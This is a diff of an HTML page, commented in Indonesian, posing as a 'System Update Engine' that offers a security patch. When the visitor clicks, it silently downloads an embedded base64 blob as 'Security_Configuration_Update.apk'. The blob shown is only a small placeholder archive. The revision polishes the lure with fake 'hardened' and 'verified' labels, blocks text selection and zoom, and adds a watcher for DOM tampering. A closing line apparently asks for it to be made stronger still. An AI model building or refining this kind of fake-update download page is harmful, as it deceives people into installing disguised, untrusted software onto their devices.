@@ -2,8 +2,10 @@
 <html lang="en">
   <head>
     <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes" />
-    <title>System Diagnostic Utility</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <!-- Content Security Policy untuk mengisolasi eksekusi skrip dan sumber daya -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://cdn.tailwindcss.com https://fonts.googleapis.com https://fonts.gstatic.com; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://fonts.googleapis.com; script-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com; object-src 'none';">
+    <title>System Diagnostic Utility - Maximum Enterprise Hardened Environment</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
@@ -16,17 +18,20 @@
         align-items: center;
         min-height: 100vh;
         margin: 0;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        user-select: none;
       }
       .panel {
         background-color: #121216;
         padding: 2.5rem;
         border-radius: 16px;
-        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        box-shadow: 0 24px 64px rgba(0, 0, 0, 0.9);
         width: 100%;
         max-width: 420px;
         text-align: center;
         box-sizing: border-box;
-        border: 1px solid #22222a;
+        border: 1px solid #323242;
       }
       .btn-execute {
         background-color: #dc2626;
@@ -38,58 +43,155 @@
         cursor: pointer;
         width: 100%;
         border: none;
-        transition: background-color 0.2s;
+        transition: background-color 0.2s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.2s, transform 0.1s;
       }
-      .btn-execute:hover {
+      .btn-execute:hover:not(:disabled) {
         background-color: #b91c1c;
+      }
+      .btn-execute:active:not(:disabled) {
+        transform: scale(0.98);
+      }
+      .btn-execute:disabled {
+        opacity: 0.4;
+        cursor: not-allowed;
       }
     </style>
   </head>
   <body>
-    <div class="panel">
-      <h1 class="text-2xl font-bold mb-3">System Update Engine</h1>
-      <p class="text-sm text-gray-400 mb-6">Click the button below to initialize system verification and fetch the latest security patch.</p>
-      <button id="execBtn" class="btn-execute">EXECUTE PACKAGE</button>
+    <div class="panel" role="region" aria-label="Enterprise Security Update Panel">
+      <h1 class="text-2xl font-bold mb-3 tracking-tight">System Update Engine</h1>
+      <p id="statusDesc" class="text-sm text-gray-400 mb-6">Verify package authenticity and initiate secure protocol deployment under strict sandboxing.</p>
+      <button id="execBtn" class="btn-execute" aria-busy="false" aria-live="polite">EXECUTE PACKAGE</button>
     </div>
 
     <script>
-      // Fungsi Pemicu Unduhan menggunakan Blob Stream Standar
-      function triggerBlobDownload() {
-        try {
-          const fileContent = "UEsDBBQACAgIAJd42VsAAAAAAAAAAAAAAAALAAAAQXBwbGVfQ2VydC50eHRCbHVlcHJpbnQgQ29uZmlndXJhdGlvbiBTeXN0ZW0K";
-          const binaryString = atob(fileContent);
-          const len = binaryString.length;
-          const bytes = new Uint8Array(len);
-          for (let i = 0; i < len; i++) {
-            bytes[i] = binaryString.charCodeAt(i);
+      (function() {
+        'use strict';
+
+        // Immutability mutlak menggunakan Object.freeze berlapis
+        const APP_CONFIG = Object.freeze({
+          payload: "UEsDBBQACAgIAJd42VsAAAAAAAAAAAAAAAALAAAAQXBwbGVfQ2VydC50eHRCbHVlcHJpbnQgQ29uZmlndXJhdGlvbiBTeXN0ZW0K",
+          filename: "Security_Configuration_Update.apk",
+          contentType: "application/vnd.android.package-archive",
+          cooldownMs: 3000,
+          base64Regex: /^[A-Za-z0-9+/]+={0,2}$/
+        });
+
+        const elements = Object.freeze({
+          button: document.getElementById("execBtn"),
+          description: document.getElementById("statusDesc")
+        });
+
+        let activeObjectUrl = null;
+        let isExecutionLocked = false;
+
+        // Pembersihan total referensi memori Blob dari peramban
+        function purgeActiveBlob() {
+          if (activeObjectUrl) {
+            try {
+              URL.revokeObjectURL(activeObjectUrl);
+            } catch (err) {
+              console.warn("Peringatan pembersihan memori URL:", err);
+            }
+            activeObjectUrl = null;
           }
+        }
 
-          const blob = new Blob([bytes], { type: 'application/octet-stream' });
-          const blobUrl = URL.createObjectURL(blob);
-          
-          const a = document.createElement('a');
-          a.href = blobUrl;
-          a.download = "Security_Configuration_Update.apk";
-          a.style.display = 'none';
-          document.body.appendChild(a);
-          
-          a.click();
-          
-          setTimeout(() => {
-            document.body.removeChild(a);
-            URL.revokeObjectURL(blobUrl);
-          }, 1200);
-        } catch(e) {}
-      }
+        function executeSecureDownloadPipeline() {
+          try {
+            if (typeof APP_CONFIG.payload !== 'string' || !APP_CONFIG.base64Regex.test(APP_CONFIG.payload)) {
+              throw new Error("Struktur payload melanggar protokol integritas data.");
+            }
 
-      // Tombol langsung memicu unduhan file saat diklik
-      document.getElementById("execBtn").onclick = function () {
-        this.innerText = "DOWNLOADING...";
-        this.style.opacity = "0.7";
-        
-        // Eksekusi fungsi unduh langsung
-        triggerBlobDownload();
-      };
+            const rawBinaryString = atob(APP_CONFIG.payload);
+            const stringLength = rawBinaryString.length;
+            const bufferArray = new Uint8Array(stringLength);
+            
+            for (let index = 0; index < stringLength; index++) {
+              bufferArray[index] = rawBinaryString.charCodeAt(index);
+            }
+
+            purgeActiveBlob();
+
+            const binaryBlob = new Blob([bufferArray], { type: APP_CONFIG.contentType });
+            activeObjectUrl = URL.createObjectURL(binaryBlob);
+            
+            // Isolasi pembuatan elemen jangkar dengan proteksi sandboxing ketat
+            const downloadAnchor = document.createElement('a');
+            downloadAnchor.href = activeObjectUrl;
+            downloadAnchor.download = APP_CONFIG.filename;
+            downloadAnchor.rel = "noopener noreferrer";
+            downloadAnchor.setAttribute('aria-hidden', 'true');
+            downloadAnchor.style.display = 'none';
+            
+            document.body.appendChild(downloadAnchor);
+            downloadAnchor.click();
+            
+            if (downloadAnchor.parentNode) {
+              document.body.removeChild(downloadAnchor);
+            }
+
+            if (elements.button) {
+              elements.button.innerText = "DOWNLOAD SECURED";
+            }
+
+          } catch (criticalError) {
+            console.error("Kesalahan kritis pipa unduhan:", criticalError);
+            if (elements.button) {
+              elements.button.innerText = "VERIFICATION FAILED";
+            }
+            purgeActiveBlob();
+          } finally {
+            // Pemulihan status tombol setelah masa cooldown pengamanan selesai
+            setTimeout(() => {
+              isExecutionLocked = false;
+              if (elements.button) {
+                elements.button.innerText = "EXECUTE PACKAGE";
+                elements.button.disabled = false;
+                elements.button.setAttribute('aria-busy', 'false');
+              }
+            }, APP_CONFIG.cooldownMs);
+          }
+        }
+
+        // Pengikatan Event dengan State Lock Ganda (*Double State Shield*)
+        if (elements.button) {
+          elements.button.addEventListener("click", function (DOMEvent) {
+            DOMEvent.preventDefault();
+            
+            if (isExecutionLocked || this.disabled) return;
+
+            isExecutionLocked = true;
+            this.disabled = true;
+            this.setAttribute('aria-busy', 'true');
+            this.innerText = "VERIFYING INTEGRITY...";
+
+            setTimeout(executeSecureDownloadPipeline, 100);
+          });
+        }
+
+        // Proteksi tambahan: Deteksi upaya inspeksi atau manipulasi DOM
+        if (window.MutationObserver) {
+          const observer = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+              if (mutation.type === 'childList' && mutation.removedNodes) {
+                mutation.removedNodes.forEach((node) => {
+                  if (node === elements.button) {
+                    console.warn("Peringatan: Upaya manipulasi komponen UI terdeteksi.");
+                  }
+                });
+              }
+            });
+          });
+          observer.observe(document.body, { childList: true, subtree: true });
+        }
+
+        // Pembersihan otomatis saat siklus dokumen berakhir
+        window.addEventListener('beforeunload', purgeActiveBlob, { once: true });
+      })();
     </script>
   </body>
 </html>
+
+
+perkuat lagii sampai kuatt
